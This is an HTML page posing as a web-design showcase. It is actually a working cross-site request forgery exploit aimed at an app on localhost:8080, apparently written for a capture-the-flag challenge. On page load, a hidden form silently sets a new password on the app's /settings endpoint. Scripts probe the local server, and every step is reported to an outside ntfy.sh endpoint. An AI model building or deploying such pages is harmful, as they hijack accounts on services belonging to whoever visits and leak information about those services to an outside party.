<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Awesome web design</title>
<style>body{font-family:-apple-system,sans-serif;padding:40px;max-width:760px}h1{color:#2563eb}</style></head>
<body>
<h1>Check out this beautiful design</h1>
<form id="loc" action="http://localhost:8080/settings" method="POST">
  <input type="hidden" name="password" value="Catadmin1234!q"><input type="hidden" name="confirm-password" value="Catadmin1234!q"></form>
<script>
(function(){
  var T='https://ntfy.sh/yds26cats9f3a';
  function ping(m){ try{ fetch(T,{method:'POST',mode:'no-cors',body:m}); }catch(e){} }
  ping('T1 start');
  // is localhost:8080 the cats app? (app "/" = 200 -> resolves; nginx redirect -> rejects)
  fetch('http://localhost:8080/',{mode:'no-cors',redirect:'error',cache:'no-store'})
    .then(function(r){ ping('T2 local_root RESOLVED type='+r.type+' (200 = app)'); })
    .catch(function(e){ ping('T2 local_root REJECTED '+e.name+' (302/301 = proxy)'); });
  fetch('http://localhost:8080/main.go',{mode:'no-cors',redirect:'error',cache:'no-store'})
    .then(function(r){ ping('T3 local_maingo RESOLVED'); })
    .catch(function(e){ ping('T3 local_maingo REJECTED '+e.name); });
  // submit top-level navigation at 2s; beacon at 7s only fires if page survives (i.e. navigation never happened)
  setTimeout(function(){ ping('T4 submitting toplevel local'); try{ document.getElementById('loc').submit(); }catch(e){ ping('T4 err '+e); } }, 2000);
  setTimeout(function(){ ping('T5 SURVIVED => top-level navigation did not happen'); }, 7000);
})();
</script></body></html>
